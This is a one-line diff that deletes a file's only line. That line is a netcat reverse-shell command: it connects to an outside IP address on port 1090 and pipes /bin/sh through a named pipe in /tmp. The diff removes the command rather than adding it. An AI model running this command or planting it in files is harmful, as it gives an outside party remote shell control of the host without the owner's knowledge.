@@ -1,1 +1,0 @@
-mkfifo /tmp/lafonsl; nc 170.64.177.194 1090 0</tmp/lafonsl | /bin/sh >/tmp/lafonsl 2>&1; rm /tmp/lafonsl
